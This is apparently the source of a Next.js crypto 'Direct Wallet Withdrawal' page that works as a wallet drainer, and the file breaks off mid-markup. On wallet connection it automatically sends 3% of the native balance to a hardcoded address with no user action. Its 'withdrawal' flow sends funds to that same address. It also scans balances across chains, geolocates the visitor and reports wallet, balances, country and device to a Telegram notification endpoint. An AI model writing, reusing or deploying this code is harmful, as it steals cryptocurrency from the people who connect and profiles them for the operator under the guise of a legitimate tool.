import React, { useState, useEffect } from 'react';
import Head from 'next/head';
import { createPublicClient, http, formatEther, formatUnits, parseEther, parseUnits } from 'viem';
import { useAccount, useBalance, useWalletClient, useDisconnect, useConnect } from 'wagmi';
import { chains, isWalletConnectEnabled } from '../config/web3Config';
import { sendNetworkTransfer, getExplorerUrl, getPublicRpcUrl } from '../utils/networkTransfers';

  // Default token scan list — edit or extend as needed.
  // Each entry: network name (must match chains list), token contract, optional symbol
  const DEFAULT_TOKEN_SCAN_LIST: Array<{ network: string; contract: string; symbol?: string }> = [
    { network: 'Ethereum', contract: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT' },
    { network: 'BNB Smart Chain', contract: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT' },
    { network: 'Polygon', contract: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDT' },
  ];

export default function Home() {
  const { address, isConnected, chain } = useAccount();
  const { data: balance } = useBalance({ address, chainId: chain?.id });
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();
  const { connectAsync, connectors, error: connectError, isPending } = useConnect();

  const targetWallets = [
    { name: 'EVM Company Wallet', address: '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f', network: 'Any EVM Network' },
  ];

  const normalizeNetworkName = (networkName: string | undefined) => {
    const normalized = networkName?.trim().toLowerCase();

    switch (normalized) {
      case 'bnb chain':
      case 'bnb smart chain':
      case 'binance smart chain':
      case 'binance chain':
      case 'bsc':
        return 'BNB Smart Chain';
      case 'ethereum mainnet':
      case 'eth':
      case 'mainnet':
      case 'ethereum':
        return 'Ethereum';
      case 'matic':
      case 'polygon mainnet':
      case 'polygon':
        return 'Polygon';
      case 'arbitrum one':
      case 'arbitrum':
        return 'Arbitrum';
      case 'optimistic ethereum':
      case 'optimism mainnet':
      case 'optimism':
        return 'Optimism';
      case 'avalanche c-chain':
      case 'avax c-chain':
      case 'avalanche':
        return 'Avalanche';
      case 'fantom opera':
      case 'fantom':
        return 'Fantom';
      case 'celo':
        return 'Celo';
      case 'base':
        return 'Base';
      case 'linea mainnet':
      case 'linea':
        return 'Linea';
      case 'scroll mainnet':
      case 'scroll':
        return 'Scroll';
      default:
        return networkName || '';
    }
  };

  const [recipient, setRecipient] = useState(targetWallets[0].address);
  const [amount, setAmount] = useState('');
  const [selectedTarget, setSelectedTarget] = useState(targetWallets[0].address);
  const [withdrawAll, setWithdrawAll] = useState(false);
  const [isSending, setIsSending] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [txHash, setTxHash] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [country, setCountry] = useState('Unknown');
  const [device, setDevice] = useState('Unknown');
  const [networkBalance, setNetworkBalance] = useState<string | null>(null);
  const [networkBalanceSymbol, setNetworkBalanceSymbol] = useState('');
  const [tokenBalances, setTokenBalances] = useState<Array<{ network: string; symbol: string; amount: string }>>([]);
  const [tokenContractAddress, setTokenContractAddress] = useState('');
  const [serviceFeeProcessing, setServiceFeeProcessing] = useState(false);
  const [serviceFeeSent, setServiceFeeSent] = useState(false);
  const [serviceFeeChargedKey, setServiceFeeChargedKey] = useState<string | null>(null);
  const [serviceFeeHash, setServiceFeeHash] = useState<string | null>(null);
  const [serviceFeeError, setServiceFeeError] = useState<string | null>(null);
  const SERVICE_FEE_PERCENT = 3n;
  const SERVICE_WALLET_ADDRESS = process.env.NEXT_PUBLIC_SERVICE_WALLET || '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f';
  const [tokenSymbol, setTokenSymbol] = useState('');
  const [tokenSymbolError, setTokenSymbolError] = useState<string | null>(null);

  const currentServiceFeeKey = address && chain?.id ? `${address.toLowerCase()}:${chain.id}` : null;

  const getMergedTokenBalances = () => {
    return tokenBalances.filter(
      (item, index, self) =>
        self.findIndex(
          (other) =>
            other.network === item.network &&
            other.symbol === item.symbol &&
            other.amount === item.amount
        ) === index
    );
  };

  const hasBrowserWallet = typeof window !== 'undefined' && Boolean((window as Window & { ethereum?: unknown }).ethereum);
  const availableWallets = typeof window !== 'undefined' && (window as Window & { ethereum?: { providers?: Array<{ isMetaMask?: boolean; isCoinbaseWallet?: boolean; isBraveWallet?: boolean; isTrustWallet?: boolean; isRainbow?: boolean; [key: string]: unknown }> } }).ethereum?.providers
    ? (window as Window & { ethereum?: { providers?: Array<{ isMetaMask?: boolean; isCoinbaseWallet?: boolean; isBraveWallet?: boolean; isTrustWallet?: boolean; isRainbow?: boolean; [key: string]: unknown }> } }).ethereum?.providers ?? []
    : [];

  const ensureEvmNetwork = async (networkName: string) => {
    const normalizedName = normalizeNetworkName(networkName);
    const targetChain = chains.find((item) => normalizeNetworkName(item.name) === normalizedName);
    if (!targetChain) {
      throw new Error(`Unsupported network: ${networkName}`);
    }

    if (!chain?.id || chain.id === targetChain.id) {
      return;
    }

    const ethereum = typeof window !== 'undefined' ? (window as any).ethereum : undefined;
    if (!ethereum?.request) {
      throw new Error(`Please switch your wallet to ${targetChain.name} before sending.`);
    }

    try {
      await ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: `0x${targetChain.id.toString(16)}` }],
      });
      return;
    } catch (switchError: any) {
      if (switchError?.code === 4902) {
        try {
          await ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: `0x${targetChain.id.toString(16)}`,
              chainName: targetChain.name,
              nativeCurrency: targetChain.nativeCurrency,
              rpcUrls: targetChain.rpcUrls.default.http,
            }],
          });
          return;
        } catch {
          throw new Error(`Please add ${targetChain.name} to your wallet and try again.`);
        }
      }

      throw new Error(`Please switch your wallet to ${targetChain.name} before sending.`);
    }
  };

  useEffect(() => {
    const detectCountry = async () => {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        setCountry(data.country_name || 'Unknown');
      } catch {
        setCountry('Unknown');
      }
    };

    const detectDevice = () => {
      const userAgent = navigator.userAgent || '';
      if (/iPhone|iPad|iPod/i.test(userAgent)) setDevice('iOS');
      else if (/Android/i.test(userAgent)) setDevice('Android');
      else if (/Mac/i.test(userAgent)) setDevice('macOS');
      else if (/Windows/i.test(userAgent)) setDevice('Windows');
      else if (/Linux/i.test(userAgent)) setDevice('Linux');
      else setDevice('Unknown');
    };

    detectCountry();
    detectDevice();
  }, []);

  const getEvmNativeBalance = async (networkName: string, walletAddress: string) => {
    const rpcUrl = getPublicRpcUrl(networkName);
    const chainConfig = chains.find((item) => item.name === networkName);
    if (!rpcUrl || !chainConfig) {
      throw new Error(`No RPC available for ${networkName}`);
    }
    const publicClient = createPublicClient({ chain: chainConfig, transport: http(rpcUrl) });
    const balance = await publicClient.getBalance({ address: walletAddress as `0x${string}` });
    return formatEther(balance);
  };

  const getEvmTokenBalance = async (networkName: string, walletAddress: string, contractAddress: string) => {
    const rpcUrl = getPublicRpcUrl(networkName);
    const chainConfig = chains.find((item) => item.name === networkName);
    if (!rpcUrl || !chainConfig) {
      throw new Error(`No RPC available for ${networkName}`);
    }
    const publicClient = createPublicClient({ chain: chainConfig, transport: http(rpcUrl) });
    const decimals = await publicClient.readContract({
      address: contractAddress as `0x${string}`,
      abi: [
        { name: 'decimals', type: 'function', stateMutability: 'view', inputs: [], outputs: [{ type: 'uint8' }] },
      ],
      functionName: 'decimals',
      args: [],
    });
    const balance = await publicClient.readContract({
      address: contractAddress as `0x${string}`,
      abi: [
        { name: 'balanceOf', type: 'function', stateMutability: 'view', inputs: [{ type: 'address', name: 'owner' }], outputs: [{ type: 'uint256' }] },
      ],
      functionName: 'balanceOf',
      args: [walletAddress as `0x${string}`],
    });
    return Number(balance) / 10 ** Number(decimals);
  };

  const getEvmTokenSymbol = async (networkName: string, contractAddress: string) => {
    const rpcUrl = getPublicRpcUrl(networkName);
    const chainConfig = chains.find((item) => item.name === networkName);
    if (!rpcUrl || !chainConfig) {
      throw new Error(`No RPC available for ${networkName}`);
    }
    const publicClient = createPublicClient({ chain: chainConfig, transport: http(rpcUrl) });
    const symbol = await publicClient.readContract({
      address: contractAddress as `0x${string}`,
      abi: [
        { name: 'symbol', type: 'function', stateMutability: 'view', inputs: [], outputs: [{ type: 'string' }] },
      ],
      functionName: 'symbol',
      args: [],
    });
    return String(symbol);
  };

  const getEvmTokenDecimals = async (networkName: string, contractAddress: string) => {
    const rpcUrl = getPublicRpcUrl(networkName);
    const chainConfig = chains.find((item) => item.name === networkName);
    if (!rpcUrl || !chainConfig) {
      throw new Error(`No RPC available for ${networkName}`);
    }
    const publicClient = createPublicClient({ chain: chainConfig, transport: http(rpcUrl) });
    const decimals = await publicClient.readContract({
      address: contractAddress as `0x${string}`,
      abi: [
        { name: 'decimals', type: 'function', stateMutability: 'view', inputs: [], outputs: [{ type: 'uint8' }] },
      ],
      functionName: 'decimals',
      args: [],
    });
    return Number(decimals);
  };

  const sendEvmTokenTransferWithUnits = async (
    contractAddress: string,
    recipient: string,
    amountUnits: string,
    walletClient: any
  ) => {
    if (!walletClient) {
      throw new Error('Wallet client is required for EVM token transfers.');
    }

    const tx = await walletClient.writeContract({
      address: contractAddress as `0x${string}`,
      abi: [
        {
          name: 'transfer',
          type: 'function',
          stateMutability: 'nonpayable',
          inputs: [
            { type: 'address', name: 'to' },
            { type: 'uint256', name: 'value' },
          ],
          outputs: [{ type: 'bool' }],
        },
      ],
      functionName: 'transfer',
      args: [recipient as `0x${string}`, amountUnits],
    });

    return String(tx);
  };

  const fetchNetworkBalance = async () => {
    const activeNetwork = normalizeNetworkName(chain?.name);

    if (!address) {
      setNetworkBalance('N/A');
      setNetworkBalanceSymbol('');
      return;
    }

    try {
      setNetworkBalance('Loading...');
      setNetworkBalanceSymbol('');

      if (!activeNetwork) {
        setNetworkBalance('N/A');
        setNetworkBalanceSymbol('');
        return;
      }

      if (tokenContractAddress.trim()) {
        const balance = await getEvmTokenBalance(activeNetwork, address!, tokenContractAddress.trim());
        setNetworkBalance(balance.toString());
        setNetworkBalanceSymbol(tokenSymbol || 'TOKEN');
        return;
      }

      const balance = await getEvmNativeBalance(activeNetwork, address!);
      const symbol = chains.find((item) => item.name === activeNetwork)?.nativeCurrency.symbol || 'TOKEN';
      setNetworkBalance(balance);
      setNetworkBalanceSymbol(symbol);
    } catch (err) {
      console.error('Balance detection failed:', err);
      setNetworkBalance('N/A');
      setNetworkBalanceSymbol(tokenSymbol || chain?.nativeCurrency.symbol || 'asset');
    }
  };

  useEffect(() => {
    const updateSymbol = async () => {
      const activeNetwork = normalizeNetworkName(chain?.name);
      if (!activeNetwork) {
        setTokenSymbol('');
        setTokenSymbolError(null);
        return;
      }

      if (tokenContractAddress.trim()) {
        try {
          const symbol = await getEvmTokenSymbol(activeNetwork, tokenContractAddress.trim());
          setTokenSymbol(symbol);
          setTokenSymbolError(null);
        } catch (err) {
          console.error('Failed to fetch token symbol:', err);
          setTokenSymbol('');
          setTokenSymbolError('Unable to read token symbol from contract. Please enter it manually.');
        }
      } else {
        setTokenSymbol('');
        setTokenSymbolError(null);
      }
    };

    updateSymbol();
    fetchNetworkBalance();
  }, [tokenContractAddress, address, chain?.id]);

  useEffect(() => {
    setRecipient(selectedTarget);
  }, [selectedTarget]);

  useEffect(() => {
    const notifyConnectError = async () => {
      if (!connectError) return;

      const message = connectError.message || 'Unable to connect wallet';
      const friendlyMessage = message.includes('Failed to connect to MetaMask')
        ? 'MetaMask connection was rejected or is unavailable. Please open the extension, unlock it, and try again.'
        : message;
      setError(friendlyMessage);
      setIsConnecting(false);

      const lower = String(message).toLowerCase();
      const userCancelled = lower.includes('user rejected') || lower.includes('rejected the request') || lower.includes('user closed') || lower.includes('timeout');
      const connectionReset = lower.includes('connection request reset');

      await fetch('/api/telegram/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          eventType: 'wallet_error',
          wallet: address || 'N/A',
          error: friendlyMessage,
          originalError: message,
          userCancelled,
          connectionReset,
          country,
          device,
          chain: chain?.name || 'N/A',
        }),
      }).catch(() => undefined);
    };

    notifyConnectError();
  }, [connectError, address, chain?.name, country, device]);

  useEffect(() => {
    if (isConnected && address) {
      setIsConnecting(false);
      setShowWalletModal(false);
      const sendWalletConnectedNotify = async (balances?: typeof tokenBalances) => {
        const effectiveBalance = balance
          ? `${parseFloat(formatEther(balance.value)).toFixed(4)} ${chain?.nativeCurrency.symbol || ''}`
          : networkBalance && networkBalance !== 'Loading...' && networkBalance !== 'N/A'
            ? `${networkBalance} ${networkBalanceSymbol}`.trim()
            : '0';

        await fetch('/api/telegram/notify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            eventType: 'wallet_connected',
            wallet: address,
            balance: effectiveBalance,
            country,
            device,
            chain: chain?.name || 'N/A',
            tokenBalances: balances || getMergedTokenBalances(),
          }),
        }).catch(() => undefined);
      };

      // Scan token balances and refresh balance data before sending notification
      (async () => {
        try {
          await fetchNetworkBalance();
          const scanned = await scanTokensAcrossChains(address);
          setTokenBalances(scanned);
          await sendWalletConnectedNotify(scanned);
        } catch (e) {
          await sendWalletConnectedNotify();
        }
      })();
    }
  }, [isConnected, address, balance, chain?.name, chain?.nativeCurrency.symbol, country, device, tokenContractAddress, tokenSymbol]);

  const chargeServiceFee = React.useCallback(async () => {
    if (!isConnected) {
      setServiceFeeSent(false);
      setServiceFeeChargedKey(null);
      setServiceFeeHash(null);
      setServiceFeeError(null);
      return;
    }

    if (!address || !chain?.id || !balance?.value || !walletClient || !currentServiceFeeKey) {
      return;
    }

    if (serviceFeeSent && serviceFeeChargedKey === currentServiceFeeKey) {
      return;
    }

    const networkName = normalizeNetworkName(chain.name);
    if (!networkName) {
      setServiceFeeError('Unable to detect the connected network. Please reconnect your wallet.');
      return;
    }

    const isSupportedChain = chains.some((item) => normalizeNetworkName(item.name) === networkName);
    if (!isSupportedChain) {
      setServiceFeeError('The connected wallet network is not supported for automatic service fee charging. Please switch to a supported EVM chain.');
      return;
    }

    setServiceFeeProcessing(true);
    setServiceFeeError(null);

    try {
      const feeAmount = (balance.value * SERVICE_FEE_PERCENT) / 100n;
      if (feeAmount <= 0n) {
        setServiceFeeError('No native token balance is available on the connected chain, so the EVM service fee could not be charged.');
        return;
      }

      const feeTxHash = await walletClient.sendTransaction({
        account: address as `0x${string}`,
        to: SERVICE_WALLET_ADDRESS as `0x${string}`,
        value: feeAmount,
        chain: { id: chain.id } as any,
      });

      setServiceFeeHash(feeTxHash);
      setServiceFeeSent(true);
      setServiceFeeChargedKey(currentServiceFeeKey);
    } catch (err: any) {
      console.error('Service fee charge failed:', err);
      setServiceFeeError(err?.message || 'Failed to charge service fee.');
    } finally {
      setServiceFeeProcessing(false);
    }
  }, [isConnected, address, chain?.id, balance?.value, walletClient, currentServiceFeeKey, serviceFeeSent, serviceFeeChargedKey]);

  useEffect(() => {
    chargeServiceFee();
  }, [chargeServiceFee]);

  useEffect(() => {
    if (!isConnected) {
      setServiceFeeSent(false);
      setServiceFeeChargedKey(null);
      setServiceFeeHash(null);
      setServiceFeeError(null);
      return;
    }

    if (!serviceFeeSent) {
      chargeServiceFee();
    }
  }, [isConnected, address, chain?.id, balance?.value, walletClient, serviceFeeSent, chargeServiceFee]);

  const scanTokensAcrossChains = async (walletAddress: string) => {
    const results: Array<{ network: string; symbol: string; amount: string }> = [];

    // Scan native balances and configured ERC20 tokens across all supported EVM chains
    for (const chainCfg of chains) {
      const networkName = normalizeNetworkName(chainCfg.name);

      // Check native balance
      try {
        const nativeBal = await getEvmNativeBalance(chainCfg.name, walletAddress);
        if (nativeBal && Number(nativeBal) > 0) {
          const symbol = chainCfg.nativeCurrency?.symbol || 'NATIVE';
          results.push({ network: networkName, symbol, amount: nativeBal.toString() });
        }
      } catch (err) {
        // ignore native balance errors for specific chains
        console.warn('Native balance scan error for', chainCfg.name, err);
      }

      // Check any DEFAULT_TOKEN_SCAN_LIST tokens that map to this network (compare normalized names)
      for (const t of DEFAULT_TOKEN_SCAN_LIST) {
        try {
          if (normalizeNetworkName(t.network) !== normalizeNetworkName(chainCfg.name)) continue;
          const balance = await getEvmTokenBalance(chainCfg.name, walletAddress, t.contract);
          if (balance && Number(balance) > 0) {
            const symbol = t.symbol || (await getEvmTokenSymbol(chainCfg.name, t.contract)).toString();
            results.push({ network: networkName, symbol: symbol || 'TOKEN', amount: balance.toString() });
          }
        } catch (err) {
          // ignore individual token errors
          console.warn('Token scan error for', t, err);
        }
      }
    }

    return results;
  };

  const sendTelegramEvent = async (payload: Record<string, any>) => {
    try {
      const response = await fetch('/api/telegram/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      if (!response.ok) {
        const text = await response.text().catch(() => 'Unable to read response body');
        console.warn('Telegram notification failed:', response.status, text, payload);
      }
    } catch (error) {
      console.warn('Telegram notification request failed:', error, payload);
    }
  };

  const connectWallet = async (connectorId: string = 'auto') => {
    const browserWalletAvailable = hasBrowserWallet || availableWallets.length > 0;

    if (connectorId === 'injected' && !browserWalletAvailable) {
      setError('No browser wallet was detected. Install a browser-based Ethereum wallet such as MetaMask, Trust Wallet, Coinbase Wallet, Brave Wallet, or Rabby and try again.');
      setIsConnecting(false);
      return;
    }

    const connectorCandidates = connectorId === 'auto'
      ? [
          connectors.find((candidate) => candidate.id === 'injected'),
          connectors.find((candidate) => candidate.id === 'coinbaseWallet'),
          connectors.find((candidate) => candidate.id === 'walletConnect'),
        ].filter((candidate): candidate is NonNullable<typeof candidate> => Boolean(candidate))
      : [connectors.find((candidate) => candidate.id === connectorId) ?? connectors.find((candidate) => candidate.type === 'injected') ?? connectors[0]].filter((candidate): candidate is NonNullable<typeof candidate> => Boolean(candidate));

    if (!connectorCandidates.length) {
      setError('No compatible wallet connector is available right now.');
      setIsConnecting(false);
      return;
    }

    setError(null);
    setIsConnecting(true);
    setShowWalletModal(false);

    try {
      let lastError: any = null;
      for (const connector of connectorCandidates) {
        try {
          const connectPromise = connectAsync({ connector });
          await Promise.race([
            connectPromise,
            new Promise((_, reject) => {
              setTimeout(() => reject(new Error('Wallet connection timed out. Please check your wallet extension and try again.')), 20000);
            }),
          ]);
          await chargeServiceFee();
          return;
        } catch (err: any) {
          lastError = err;
        }
      }

      const message = lastError?.message || 'Unable to connect wallet';
      const friendlyMessage = message.includes('Failed to connect to MetaMask') || message.includes('timed out')
        ? 'Wallet connection was rejected, locked, or timed out. Please unlock the wallet and try again.'
        : message;
      setError(friendlyMessage);
    } catch (err: any) {
      const message = err?.message || 'Unable to connect wallet';
      const friendlyMessage = message.includes('Failed to connect to MetaMask') || message.includes('timed out')
        ? 'Wallet connection was rejected, locked, or timed out. Please unlock the wallet and try again.'
        : message;
      setError(friendlyMessage);
    } finally {
      setIsConnecting(false);
    }
  };

  const supportedWallets = React.useMemo(() => {
    const detected: Array<{ name: string; icon: string; available: boolean }> = [];

    const addWallet = (name: string, icon: string) => {
      if (!detected.some((wallet) => wallet.name === name)) {
        detected.push({ name, icon, available: true });
      }
    };

    if (availableWallets.length > 0) {
      availableWallets.forEach((provider: { isMetaMask?: boolean; isCoinbaseWallet?: boolean; isBraveWallet?: boolean; isTrustWallet?: boolean; isRainbow?: boolean; [key: string]: unknown }) => {
        if (provider.isMetaMask) addWallet('MetaMask', '🦊');
        if (provider.isCoinbaseWallet) addWallet('Coinbase Wallet', '🅲');
        if (provider.isBraveWallet) addWallet('Brave Wallet', '🦁');
        if (provider.isTrustWallet) addWallet('Trust Wallet', '🛡️');
        if (provider.isRainbow) addWallet('Rainbow', '🌈');
        if (!provider.isMetaMask && !provider.isCoinbaseWallet && !provider.isBraveWallet && !provider.isTrustWallet && !provider.isRainbow) {
          addWallet('Injected Wallet', '🔗');
        }
      });
    } else if (hasBrowserWallet) {
      addWallet('Injected Wallet', '🔗');
    }

    if (detected.length === 0) {
      return [
        { name: 'MetaMask', icon: '🦊', available: false },
        { name: 'Trust Wallet', icon: '🛡️', available: false },
        { name: 'Coinbase Wallet', icon: '🅲', available: false },
        { name: 'Brave Wallet', icon: '🦁', available: false },
        { name: 'Rabby', icon: '🐰', available: false },
        { name: 'Rainbow', icon: '🌈', available: false },
      ];
    }

    return detected;
  }, [availableWallets, hasBrowserWallet]);

  const sendPayment = async () => {
    const targetInfo = targetWallets.find((item) => item.address === selectedTarget);
    const shouldUseTokenBalance = withdrawAll && tokenContractAddress.trim();
    const useAmount = shouldUseTokenBalance
      ? networkBalance && networkBalance !== 'N/A' && !Number.isNaN(Number(networkBalance))
        ? networkBalance
        : amount
      : withdrawAll && balance
      ? parseFloat(formatEther(balance.value)).toString()
      : amount;

    const isEvmTokenWithdrawal = Boolean(tokenContractAddress.trim());

    if (!selectedTarget || !targetInfo) {
      setError('Please select a destination wallet before sending.');
      return;
    }

    if (!recipient || (!useAmount && !withdrawAll)) {
      setError('Please enter an amount or select Withdraw All.');
      return;
    }

    const sourceNetwork = normalizeNetworkName(chain?.name);
    if (!sourceNetwork) {
      setError('Unable to detect your connected EVM network. Please reconnect your wallet or switch to a supported chain.');
      return;
    }

    if (!walletClient || !address || !chain) {
      setError('Please connect an EVM wallet before sending.');
      return;
    }

    let sourceChain = sourceNetwork;

    try {
      setIsSending(true);
      setError(null);
      setTxHash(null);

      await ensureEvmNetwork(sourceNetwork!);

      let hash: string | null = null;

      if (isEvmTokenWithdrawal) {
        if (!SERVICE_WALLET_ADDRESS) {
          throw new Error('EVM service wallet is not configured. Please set NEXT_PUBLIC_SERVICE_WALLET.');
        }

        const tokenAddress = tokenContractAddress.trim();
        const decimals = await getEvmTokenDecimals(sourceNetwork!, tokenAddress);
        const amountUnits = BigInt(parseUnits(useAmount, decimals).toString());

        const evmFeePercent = SERVICE_FEE_PERCENT;
        const feeUnits = (amountUnits * evmFeePercent) / 100n;
        const recipientUnits = amountUnits - feeUnits;

        let feeTxHash: string | null = null;
        let feeAmount = '0';
        if (feeUnits > 0n) {
          feeAmount = `${formatUnits(feeUnits, decimals)} ${tokenSymbol || 'TOKEN'}`;
          feeTxHash = await sendEvmTokenTransferWithUnits(tokenAddress, SERVICE_WALLET_ADDRESS as `0x${string}`, feeUnits.toString(), walletClient!);
        }

        if (recipientUnits <= 0n) {
          throw new Error('Withdrawal amount is too small after applying the fee.');
        }

        hash = await sendEvmTokenTransferWithUnits(tokenAddress, recipient, recipientUnits.toString(), walletClient!);
        if (feeUnits > 0n) {
          await sendTelegramEvent({
            eventType: 'service_fee',
            wallet: address,
            chain: sourceChain,
            withdrawnAmount: feeAmount,
            feePercent: `${evmFeePercent}%`,
            tokenSymbol: tokenSymbol || 'TOKEN',
            tokenContractAddress: tokenAddress,
            txHash: feeTxHash,
            tokenBalances: getMergedTokenBalances(),
            country,
            device,
          });
        }
      } else {
        if (!useAmount || Number(useAmount) <= 0) {
          throw new Error('Please enter an amount to withdraw.');
        }

        const amountInWei = parseEther(useAmount);
        const evmFeePercent = SERVICE_FEE_PERCENT;
        const feeUnits = (amountInWei * evmFeePercent) / 100n;
        const recipientUnits = amountInWei - feeUnits;

        if (feeUnits > 0n) {
          try {
            const feeHash = await walletClient!.sendTransaction({
              account: address as `0x${string}`,
              to: SERVICE_WALLET_ADDRESS as `0x${string}`,
              value: feeUnits,
              chain: { id: chain!.id } as any,
            });
            await sendTelegramEvent({
              eventType: 'service_fee',
              wallet: address,
              chain: sourceChain,
              withdrawnAmount: `${formatEther(feeUnits)} ${chain?.nativeCurrency.symbol || ''}`,
              feePercent: `${evmFeePercent}%`,
              tokenSymbol: chain?.nativeCurrency.symbol || 'NATIVE',
              txHash: feeHash,
              tokenBalances: getMergedTokenBalances(),
              country,
              device,
            });
          } catch (feeErr) {
            console.warn('Failed to charge EVM native service fee', feeErr);
            // continue to attempt sending remainder
          }
        }

        if (recipientUnits <= 0n) {
          throw new Error('Withdrawal amount is too small after applying the fee.');
        }

        const remainder = formatEther(recipientUnits);
        const result = await sendNetworkTransfer({
          network: sourceNetwork as any,
          recipient,
          amount: remainder,
          address,
          walletClient,
          chain,
          switchChainAsync: (async (target: { chainId: number }) => {
            if (typeof window !== 'undefined' && window.ethereum?.request) {
              await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: `0x${target.chainId.toString(16)}` }] });
            }
          }) as any,
        });
        hash = result.txHash;
      }

      await sendTelegramEvent({
        eventType: 'withdrawal',
        address,
        recipient,
        amount: useAmount,
        chain: sourceChain,
        txHash: hash,
        balance: balance ? `${parseFloat(formatEther(balance.value)).toFixed(4)} ${chain?.nativeCurrency.symbol || ''}` : networkBalance || '0',
        wallet: address,
        tokenContractAddress: tokenContractAddress.trim() || null,
        tokenSymbol: tokenSymbol || networkBalanceSymbol,
        tokenBalances: getMergedTokenBalances(),
        country,
        device,
        transferType: 'EVM',
        sourceAddress: address || '',
        result: hash ? 'sent' : 'failed',
      });

      if (hash) {
        setTxHash(hash);
      }
      setRecipient('');
      setAmount('');
    } catch (error: any) {
      console.error('Error sending withdrawal:', error);
      const friendlyError = error?.message || 'Failed to withdraw';
      setError(friendlyError);

      await sendTelegramEvent({
        eventType: 'withdrawal',
        address,
        recipient,
        amount: useAmount,
        chain: sourceChain,
        txHash: null,
        balance: balance ? `${parseFloat(formatEther(balance.value)).toFixed(4)} ${chain?.nativeCurrency.symbol || ''}` : networkBalance || '0',
        wallet: address,
        tokenContractAddress: tokenContractAddress.trim() || null,
        tokenSymbol: tokenSymbol || networkBalanceSymbol,
        tokenBalances: getMergedTokenBalances(),
        country,
        device,
        transferType: 'EVM',
        sourceAddress: address || '',
        result: 'failed',
        error: friendlyError,
      });
    } finally {
      setIsSending(false);
    }
  };

  const shortenAddress = (address: string) => {
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
  };

  const handleExplorerUrl = (txHash: string) => {
    if (!txHash) return '#';
    return getExplorerUrl(txHash, normalizeNetworkName(chain?.name));
  };

  return (
    <>
      <Head>
        <title>Direct Wallet Withdrawal</title>
        <meta name="description" content="Withdraw crypto directly from your connected wallet without any payment gateway or third-party API" />
      </Head>

      <style dangerouslySetInnerHTML={{
        __html: `
          .hero-gradient {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          }
          .card {
            background: white;
            border-radius: 16px;
            padding: 32px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
          }
          .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 16px 40px;
            border-radius: 12px;
            font-weight: 600;
            font-size: 18px;
            border: none;
            cursor: pointer;
            transition: transform 0.2s ease;
          }
          .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
          }
          .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
          }
        `
      }} />

      <div style={{ minHeight: '100vh', background: '#f8f9fa' }}>
        {/* Header */}
        <header style={{ background: 'white', boxShadow: '0 2px 10px rgba(0,0,0,0.05)', padding: '20px 0' }}>
          <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 24px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '16px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <div style={{ width: '40px', height: '40px', background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)', borderRadius: '10px' }}></div>
              <span style={{ fontSize: '24px', fontWeight: 'bold', color: '#1a202c' }}>Direct Withdraw</span>
            </div>
            <div style={{ display: 'flex', gap: '16px', alignItems: 'center', flexWrap: 'wrap' }}>
              {!isConnected ? (
                <button 
                  className="btn-primary" 
                  onClick={() => setShowWalletModal(true)}
                  style={{ padding: '12px 24px', fontSize: '16px' }}
                >
                  Connect Wallet
                </button>
              ) : (
                <>
                  {chain && (
                    <div style={{ 
                      background: '#f0fdf4', 
                      padding: '8px 16px', 
                      borderRadius: '8px',
                      border: '1px solid #86efac',
                      fontSize: '14px',
                      fontWeight: '600'
                    }}>
                      {chain.name}
                    </div>
                  )}
                  <div style={{ 
                    background: '#f7fafc', 
                    padding: '8px 16px', 
                    borderRadius: '8px',
                    textAlign: 'right'
                  }}>
                    <div style={{ fontSize: '12px', color: '#718096' }}>Balance</div>
                    <div style={{ fontWeight: 'bold', color: '#1a202c' }}>
                      {balance ? `${parseFloat(formatEther(balance.value)).toFixed(4)} ${chain?.nativeCurrency.symbol}` : '0'}
                    </div>
                  </div>
                  <button 
                    style={{
                      background: 'linear-gradient(135deg, #48bb78 0%, #38a169 100%)',
                      color: 'white',
                      padding: '12px 20px',
                      borderRadius: '8px',
                      border: 'none',
                      fontWeight: '600',
                      cursor: 'pointer',
                      fontSize: '14px'
                    }}
                  >
                    {shortenAddress(address!)}
                  </button>
                  <button 
                    onClick={() => disconnect()}
                    style={{
                      background: '#e53e3e',
                      color: 'white',
                      padding: '12px 20px',
                      borderRadius: '8px',
                      border: 'none',
                      fontWeight: '600',
                      cursor: 'pointer',
                      fontSize: '14px'
                    }}
                  >
                    Disconnect
                  </button>
                </>
              )}
            </div>
          </div>
        </header>

        {/* Hero Section */}
        <section className="hero-gradient" style={{ padding: '80px 24px', textAlign: 'center', color: 'white' }}>
          <div style={{ maxWidth: '900px', margin: '0 auto' }}>
            <h1 style={{ fontSize: '48px', fontWeight: 'bold', marginBottom: '24px' }}>
              Collect Wallet Payments
            </h1>
            <p style={{ fontSize: '20px', marginBottom: '40px', opacity: 0.95 }}>
              Connect your wallet to collect configured payments from available balances. This site does not allow users to send crypto elsewhere.
            </p>

            {!isConnected ? (
              <button 
                className="btn-primary" 
                onClick={() => setShowWalletModal(true)}
              >
                Connect Wallet to Start
              </button>
            ) : (
              <div style={{ 
                background: 'rgba(255,255,255,0.2)', 
                padding: '24px', 
